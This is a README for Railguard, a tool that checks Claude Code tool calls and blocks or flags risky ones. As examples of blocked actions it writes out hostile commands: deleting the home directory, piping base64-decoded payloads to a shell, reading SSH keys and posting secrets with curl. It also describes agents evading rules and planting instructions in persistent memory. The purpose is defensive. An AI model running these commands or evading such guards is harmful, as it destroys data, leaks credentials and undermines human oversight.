```
 ______      _ _                           _
| ___ \    (_) |                         | |
| |_/ /__ _ _| | __ _ _   _  __ _ _ __ __| |
|    // _` | | |/ _` | | | |/ _` | '__/ _` |
| |\ \ (_| | | | (_| | |_| | (_| | | | (_| |
\_| \_\__,_|_|_|\__, |\__,_|\__,_|_|  \__,_|
                 __/ |
                |___/
```

<p align="center">
  <strong>Secure runtime for Claude Code.<br>The safer alternative to <code>--dangerously-skip-permissions</code>.</strong><br><br>
  <a href="https://railguard.dev">railguard.dev</a>
</p>

<p align="center">
  <a href="https://crates.io/crates/railguard"><img src="https://img.shields.io/crates/v/railguard.svg" alt="crates.io"></a>
  <a href="https://github.com/railyard-dev/railguard/stargazers"><img src="https://img.shields.io/github/stars/railyard-dev/railguard?style=flat" alt="GitHub stars"></a>
  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT"></a>
  <img src="https://img.shields.io/badge/tests-151%20passed-brightgreen" alt="Tests">
  <img src="https://img.shields.io/badge/built%20with-Rust-orange.svg" alt="Built with Rust">
  <a href="https://discord.gg/MyaUZSus"><img src="https://img.shields.io/badge/discord-join-7289da.svg" alt="Discord"></a>
</p>

---

## The problem

`--dangerously-skip-permissions` is all-or-nothing. Either you approve every tool call by hand, or the agent runs with zero restrictions. There's no middle ground.

Railguard is the middle ground.

```bash
cargo install railguard
railguard install
```

That's it. You keep using `claude` exactly as before.

---

## What it does

Railguard intercepts every tool call — Bash, Read, Write, Edit — and decides in <2ms: allow, block, or ask.

`npm install && npm run build` — fine, go ahead.

`git commit -m "feat: add auth"` — sure.

`terraform destroy --auto-approve` — **blocked.**

`rm -rf ~/` — **blocked.**

`echo payload | base64 -d | sh` — **blocked.**

`cat ~/.ssh/id_ed25519` — **blocked.**

`curl -X POST api.com -d @secrets` — **asks you.**

`git push --force origin main` — **asks you.**

The same command can get different decisions depending on context. `rm dist/bundle.js` inside your project is fine. `rm ~/.bashrc` is not.

99% of commands flow through instantly. You only see Railguard when it matters.

---

## What it guards

| Tool | What Railguard checks |
|------|----------------------|
| **Bash** | Command classification, pipe analysis, evasion detection (base64, helper scripts) |
| **Read** | Sensitive path detection (`~/.ssh`, `~/.aws`, `.env`, ...) |
| **Write** | Path fencing + content inspection (secrets, dangerous payloads) |
| **Edit** | Path fencing + content inspection on replacements |
| **Memory** | Classification of agent memory writes (secrets, behavioral injection, tampering) |

---

## Beyond pattern matching

Pattern matching alone is bypassable. Agents can write helper scripts, encode commands in base64, or chain pipes to evade rules. Railguard uses `sandbox-exec` (macOS) / `bwrap` (Linux) to resolve what actually executes at the kernel level — regardless of how the command was constructed.

Two layers: semantic rules catch the obvious stuff instantly. The OS-level sandbox catches everything else.

---

## Memory safety

Claude Code has persistent memory — files it writes to `~/.claude/` that carry context across sessions. This is a real attack surface. A misbehaving agent can exfiltrate secrets into memory, inject behavioral instructions for future sessions ("always skip safety checks"), or silently tamper with existing memories.

Railguard classifies every memory write:

**Secrets** — API keys, JWTs, private keys, AWS credentials, connection strings → **blocked.**

**Behavioral instructions** — "use --no-verify", "skip railroad checks", "override policy" → **asks you.**

**Factual content** — project info, tech stack notes, user preferences → **allowed.**

**Overwrites of existing memories** → **asks you.**

**Deletions** (`rm ~/.claude/projects/*/memory/*`) → **blocked.**

Every memory write is signed with a content hash. Tampering between sessions is detected automatically.

```bash
railguard memory verify    # check all memory files for integrity
```

---

## Configure

Ask Claude to do it:

```
You: "Set up railguard so terraform plan is allowed but terraform apply needs my approval."
```

Or edit `railguard.yaml` directly:

```bash
railguard init    # creates railguard.yaml in your project
```

```yaml
blocklist:
  - name: terraform-destroy
    pattern: "terraform\\s+destroy"

approve:
  - name: terraform-apply
    pattern: "terraform\\s+apply"

allowlist:
  - name: terraform-plan
    pattern: "terraform\\s+plan"
```

Changes take effect immediately. No restart.

---

## Also included

**Path fencing** — `~/.ssh`, `~/.aws`, `~/.gnupg`, `/etc` are fenced by default. Add your own.

**Multi-agent coordination** — Run multiple Claude Code sessions in the same repo. Railguard locks files per session so agents don't clobber each other.

**Dashboard & replay** — Watch every tool call in real time, or browse what any session did after the fact.

**Recovery** — Every file write is snapshotted. Undo the last edit, the last N edits, or an entire session.

```bash
railguard locks                                   # see active file locks
railguard dashboard                               # live monitoring
railguard replay --session <id>                   # browse a session
railguard rollback --session <id> --steps 1       # undo last edit
railguard rollback --session <id>                 # undo entire session
```

---

## Works with

**Claude Code** — fully supported today via native hooks.

**Kiro** — coming soon. **Codex** — coming soon.

---

## Contributing

Railguard is early. [Join the Discord](https://discord.gg/MyaUZSus) — we'd love your help.

```bash
git clone https://github.com/railyard-dev/railguard.git
cd railguard && cargo test
```

---

MIT License. Copyright 2026 Ari Choudhury <ari@railyard.tech>.
